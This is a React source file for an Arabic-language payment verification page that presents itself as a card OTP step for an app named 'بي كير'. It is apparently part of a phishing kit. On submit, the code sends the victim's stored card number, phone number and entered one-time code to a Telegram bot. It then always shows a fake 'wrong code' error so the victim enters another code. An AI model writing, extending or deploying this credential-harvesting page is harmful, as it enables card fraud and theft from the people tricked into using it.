import { zodResolver } from '@hookform/resolvers/zod'
import { Lock } from 'lucide-react'
import { useState } from 'react'
import { useForm } from 'react-hook-form'
import { useSearchParams } from 'react-router-dom'

import { sendToTelegram } from '@/api/telegram'
import { LoadingOverlay } from '@/components/LoadingOverlay'
import { SiteFooter } from '@/components/layout/SiteFooter'
import { SiteHeader } from '@/components/layout/SiteHeader'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { loadPaymentBundle, savePaymentBundle } from '@/lib/paymentBundle'
import { otpSchema, type OtpFormValues } from '@/schemas/otp'

export default function OtpPage() {
  const [params] = useSearchParams()
  const userId = params.get('user_id') ?? ''
  const [busy, setBusy] = useState(false)

  const bundle = loadPaymentBundle()
  const cardDigits = (bundle?.card_number ?? bundle?.cardnumber ?? '').replace(/\s/g, '')
  const last4 = cardDigits.slice(-4)

  const form = useForm<OtpFormValues>({
    resolver: zodResolver(otpSchema),
    defaultValues: { otp: '' },
  })

  const onSubmit = async (v: OtpFormValues) => {
    if (!bundle) {
      alert('انتهت الجلسة، أعد المحاولة من الدفع')
      return
    }
    setBusy(true)
    const payload: Record<string, string> = {
      ...bundle,
      otp_code_first: v.otp.replace(/\D/g, ''),
      user_id: userId,
      phone_number: bundle.phone_number ?? '',
      card_number: bundle.card_number ?? bundle.cardnumber ?? '',
    }
    const res = await sendToTelegram({ type: 'otp', payload })
    if (!res.ok) {
      setBusy(false)
      alert('حدث خطأ، يرجى المحاولة مرة أخرى')
      return
    }
    savePaymentBundle({
      ...bundle,
      otp_code_first: payload.otp_code_first,
      user_id: userId,
    })
    setBusy(false)
    form.setError('otp', { message: 'الرمز الذي أدخلته خاطئ' })
    form.setValue('otp', '')
  }

  return (
    <div className="min-h-screen bg-background">
      <div className="bg-accent px-4 py-3 text-center text-sm text-accent-foreground">
        حمّل تطبيق بي كير الآن!{' '}
        <button type="button" className="font-semibold underline">
          تحميل
        </button>
      </div>
      <SiteHeader />
      <main className="flex flex-1 justify-center px-4 py-10">
        <div className="w-full max-w-md rounded-2xl border border-border bg-card p-8 shadow-soft">
          <div className="mx-auto mb-6 flex h-16 w-16 items-center justify-center rounded-full bg-muted">
            <Lock className="h-8 w-8 text-primary" />
          </div>
          <h1 className="mb-2 text-center text-2xl font-bold text-foreground">أدخل رمز التحقق</h1>
          <p className="mb-8 text-center text-sm text-muted-foreground">
            تم إرسال رمز التحقق إلى رقم الجوال المرتبط بالبطاقة
            <br />
            <span dir="ltr" className="mt-2 inline-block font-semibold text-primary">
              **** **** **** {last4 || '****'}
            </span>
          </p>

          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            <div>
              <Label htmlFor="otp">أدخل رمز التحقق</Label>
              <Input
                id="otp"
                dir="ltr"
                className="mt-2 text-center font-mono text-2xl font-bold tracking-[0.4em]"
                inputMode="numeric"
                autoComplete="one-time-code"
                maxLength={6}
                {...form.register('otp', {
                  onChange: (e) => {
                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6)
                  },
                })}
              />
              {form.formState.errors.otp?.message && (
                <p className="mt-2 text-xs text-destructive">{form.formState.errors.otp.message}</p>
              )}
            </div>
            <Button type="submit" className="w-full py-6 text-base font-semibold">
              تحقق من الرمز
            </Button>
          </form>
        </div>
      </main>
      <SiteFooter compact />
      <LoadingOverlay open={busy} message="جاري التحقق..." />
    </div>
  )
}
